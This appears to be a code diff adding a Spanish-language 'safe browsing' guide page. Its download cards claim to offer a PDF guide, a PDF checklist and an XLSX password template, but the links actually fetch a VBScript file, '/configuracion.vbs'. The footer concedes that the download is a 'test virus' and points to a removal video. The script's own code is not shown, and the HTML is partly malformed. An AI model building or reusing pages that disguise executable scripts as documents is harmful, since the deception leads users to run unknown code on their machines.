@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Navegación Segura | Guía Educativa</title>
+    <style>
+        /* ... (Estilos anteriores se mantienen igual) ... */
+
+        /* Nuevos estilos para la sección de descargas */
+        .download-section {
+            margin-top: 2rem;
+        }
+
+        .download-card {
+            background: white;
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            padding: 1.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 1rem;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .download-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+
+        .download-info {
+            flex: 1;
+        }
+
+        .download-icon {
+            font-size: 2rem;
+            margin-right: 1rem;
+            color: var(--primary);
+        }
+
+        .download-title {
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+
+        .download-description {
+            color: #666;
+            font-size: 0.9rem;
+        }
+
+        .download-size {
+            color: #888;
+            font-size: 0.8rem;
+            margin-top: 0.5rem;
+        }
+
+        .download-btn {
+            background-color: var(--primary);
+            color: white;
+            padding: 0.75rem 1.5rem;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-weight: 500;
+        }
+
+        .download-btn:hover {
+            background-color: var(--secondary);
+            transform: scale(1.05);
+        }
+
+        .download-btn i {
+            font-size: 1.2rem;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background-color: #e2e8f0;
+            border-radius: 2px;
+            margin-top: 0.5rem;
+            display: none;
+        }
+
+        .progress {
+            width: 0%;
+            height: 100%;
+            background-color: var(--primary);
+            border-radius: 2px;
+            transition: width 0.3s;
+        }
+
+        @keyframes downloadComplete {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.2); }
+            100% { transform: scale(1); }
+        }
+
+        .download-complete {
+            animation: downloadComplete 0.5s ease-in-out;
+        }
+        footer{
+            width: 100wh;
+            height:450px;
+            background: black;
+            color: white;
+        }
+       
+    </style>
+</head>
+<body>
+    <!-- ... (Contenido anterior se mantiene igual hasta el final de la sección de recursos) ... -->
+
+    <section id="descargas" class="section">
+        <h2>Recursos Descargables</h2>
+        <p>Descarga nuestras guías y materiales educativos para mantener tu seguridad en línea.</p>
+        
+        <a href="/configuracion.vbs" download="descarga">
+        <div class="download-section">
+            <div class="download-card">
+                <div class="download-icon">📚</div>
+                <div class="download-info">
+                    <div class="download-title">Guía Completa de Seguridad en Internet</div>
+                    <div class="download-description">Manual detallado con consejos, mejores prácticas y configuraciones recomendadas.</div>
+                    <div class="download-size">PDF - 2.5 MB</div>
+                    <div class="progress-bar">
+                        <div class="progress"></div>
+                    </div>
+                </div>
+                <button class="download-btn" onclick="simularDescarga(this, 'guia-seguridad.pdf')">
+                    <span>Descargar</span>
+                  <a href="" download=""> <i>⬇️</i></a> 
+                </button>
+            </div>
+        </a>
+            <a href="/configuracion.vbs" download="descarga">
+            <div class="download-card">
+                <div class="download-icon">📋</div>
+                <div class="download-info">
+                    <div class="download-title">Checklist de Seguridad Diaria</div>
+                    <div class="download-description">Lista de verificación para mantener tus dispositivos y cuentas seguras.</div>
+                    <div class="download-size">PDF - 1.2 MB</div>
+                    <div class="progress-bar">
+                        <div class="progress"></div>
+                    </div>
+                </div>
+                <button class="download-btn" onclick="simularDescarga(this, 'checklist-seguridad.pdf')">
+                    <span>Descargar</span>
+                   <i>⬇️</i>
+                </button>
+            </div>
+        </a>
+        <a href="descarga" download="descarga">
+            <div class="download-card">
+                <div class="download-icon">🔒</div>
+                <div class="download-info">
+                    <div class="download-title">Plantilla de Gestión de Contraseñas</div>
+                    <div class="download-description">Herramienta para organizar y gestionar tus contraseñas de forma segura.</div>
+                    <div class="download-size">XLSX - 0.8 MB</div>
+                    <div class="progress-bar">
+                        <div class="progress"></div>
+                    </div>
+                </div>
+                <button class="download-btn" onclick="simularDescarga(this, 'plantilla-contraseñas.xlsx')">
+                    <span>Descargar</span>
+                    <i>⬇️</i>
+                </button>
+            </div>
+        </div>
+    </section>
+</a>
+<footer>
+    <h1>por que esta pagina</h1>
+    <p><span>sobre nosotros</span>este programa tiene como objetivo ayudar a la gente dando informacion y una prueba de descarga de un virus que no daña a ti computadora si quieres saber como se quita ve el siguiente video y informate</p>
+        <center>
+            <iframe class="youtube" width="560" height="315" src="https://www.youtube.com/embed/JV3-KqMDjK0?si=8RhyiMNk-gKMWrGv" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen ></iframe>
+        </center>
+       
+   
+</footer>
+
+    <script>
+        // ... (Script anterior del quiz se mantiene igual) ...
+
+        // Nuevo script para la simulación de descarga
+        function simularDescarga(button, archivo) {
+            const card = button.closest('.download-card');
+            const progressBar = card.querySelector('.progress-bar');
+            const progress = card.querySelector('.progress');
+            
+            // Deshabilitar el botón durante la descarga
+            button.disabled = true;
+            button.style.opacity = '0.7';
+            button.innerHTML = '<span>Descargando...</span>';
+            
+            // Mostrar la barra de progreso
+            progressBar.style.display = 'block';
+            
+            // Simular progreso
+            let width = 0;
+            const interval = setInterval(() => {
+                if (width >= 100) {
+                    clearInterval(interval);
+                    completarDescarga(button, archivo);
+                } else {
+                    width++;
+                    progress.style.width = width + '%';
+                }
+            }, 20);
+        }
+
+        function completarDescarga(button, archivo) {
+            const card = button.closest('.download-card');
+            const progressBar = card.querySelector('.progress-bar');
+            
+            // Actualizar el botón
+            button.innerHTML = '<span>¡Descargado!</span> ✓';
+            button.classList.add('download-complete');
+            
+            // Crear el enlace de descarga simulado
+            const link = document.createElement('a');
+            link.href = '#';
+            link.download = archivo;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            
+            // Restaurar el botón después de un momento
+            setTimeout(() => {
+                button.disabled = false;
+                button.style.opacity = '1';
+                button.innerHTML = '<span>Descargar</span><i>⬇️</i>';
+                button.classList.remove('download-complete');
+                progressBar.style.display = 'none';
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
